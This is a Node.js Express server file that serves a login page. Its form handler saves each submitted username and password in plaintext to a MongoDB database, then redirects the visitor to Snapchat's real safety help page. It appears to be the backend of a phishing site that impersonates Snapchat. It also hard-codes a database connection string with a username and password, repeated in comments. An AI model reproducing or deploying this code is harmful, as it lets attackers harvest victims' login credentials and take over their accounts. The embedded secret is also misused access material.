// Import necessary modules
const express = require('express');
const bodyParser = require('body-parser');
const { MongoClient } = require('mongodb');
const path = require('path');
// Create an Express app
const app = express();
const port = process.env.PORT || 3000;

//36P0wCQRW8Xkci9n
//teamsnapchatinorg
// MongoDB connection URL and Database name
const url = 'mongodb+srv://teamsnapchatinorg:36P0wCQRW8Xkci9n@cluster0.uhdwtra.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
const dbName = 'userDB';

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like the HTML form)
app.use(express.static('public'));

// Route to handle form submission
app.post('/login_form', async (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Connect to MongoDB
  const client = new MongoClient(url, { useNewUrlParser: true, useUnifiedTopology: true });

  try {
    await client.connect();
    console.log("Connected to database");
    const db = client.db(dbName);
    const collection = db.collection('users');

    // Insert the form data into the 'users' collection
    await collection.insertOne({ username, password });

    // Send a response to the client
    res.redirect("https://help.snapchat.com/hc/en-us/categories/5685833655188-Safety-and-Security")
    // res.send('Form data has been saved to the database');
  } catch (err) {
    console.error(err);
    res.status(500).send('Error connecting to the database');
  } finally {
    await client.close();
  }
});


// Default route to serve the login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});